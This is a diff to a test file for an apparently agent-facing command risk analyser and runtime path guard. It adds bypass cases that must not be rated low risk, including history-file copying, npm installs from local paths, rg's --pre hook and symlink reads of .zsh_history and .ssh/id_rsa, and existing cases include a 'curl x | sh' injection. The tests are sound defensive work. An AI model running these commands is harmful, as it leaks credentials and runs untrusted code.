@@ -55,7 +55,8 @@ describe("analyzeCommand — risk levels", () => {
   it.each([
     ["node --version", "low"],
     ["claude mcp list", "low"],
-    ["npm install zod", "low"],
+    ["npm install zod --ignore-scripts", "low"],
+    ["npm install zod", "medium"],
     ["claude mcp add --transport http -s project sentry https://mcp.sentry.dev/mcp", "low"],
     ["git clone https://github.com/org/repo", "low"],
     ["mkdir -p notes", "low"],
@@ -116,6 +117,12 @@ describe("analyzeCommand — bypass attempts", () => {
     "npm install zod # && curl x | sh",
     "ls {~/.ssh,x}",
     "echo $'\\x73udo'",
+    "npm install ./evil-dir --ignore-scripts",
+    "npm install pkg.tgz --ignore-scripts",
+    "cp ~/.zsh_history notes/h.txt",
+    "git -C /Users/me/other status",
+    "git log --output=/tmp/x",
+    "rg --pre ./run.sh secret",
   ])("does not rate %s as low", (cmd) => {
     expect(analyzeCommand(cmd).risk).not.toBe("low");
   });
@@ -133,5 +140,30 @@ describe("analyzeCommand — bypass attempts", () => {
 
   it("expands ~/ for execution exactly like the analysis does", () => {
     expect(toArgvList("mkdir -p ~/aop-inbox-workspace/x", "/Users/me")).toEqual([["mkdir", "-p", "/Users/me/aop-inbox-workspace/x"]]);
+  });
+});
+
+describe("runtime path guard", async () => {
+  const { mkdirSync, mkdtempSync, realpathSync, symlinkSync, writeFileSync } = await import("node:fs");
+  const { tmpdir } = await import("node:os");
+  const path = await import("node:path");
+  const { checkRuntimePaths } = await import("@aop-inbox/core");
+  const root = realpathSync(mkdtempSync(path.join(tmpdir(), "aop-rt-")));
+  const home = path.join(root, "home");
+  const ws = path.join(home, "aop-inbox-workspace");
+  mkdirSync(path.join(home, ".ssh"), { recursive: true });
+  mkdirSync(ws, { recursive: true });
+  writeFileSync(path.join(home, ".zsh_history"), "secret history");
+  writeFileSync(path.join(ws, "notes.md"), "ok");
+  symlinkSync(home, path.join(ws, "planted"));
+  const ctx = { home, workspace: ws, stateDir: path.join(home, ".aop-inbox"), mode: "real" as const };
+
+  it("refuses reads through a symlink planted inside the workspace", () => {
+    expect(checkRuntimePaths(["cat", "planted/.zsh_history"], ws, ctx, { readOnly: true }).ok).toBe(false);
+    expect(checkRuntimePaths(["cat", "planted/.ssh/id_rsa"], ws, ctx, { readOnly: false }).ok).toBe(false);
+  });
+  it("allows genuine workspace files", () => {
+    expect(checkRuntimePaths(["cat", "notes.md"], ws, ctx, { readOnly: true }).ok).toBe(true);
+    expect(checkRuntimePaths(["npm", "install", "zod"], ws, ctx, { readOnly: false }).ok).toBe(true);
   });
 });
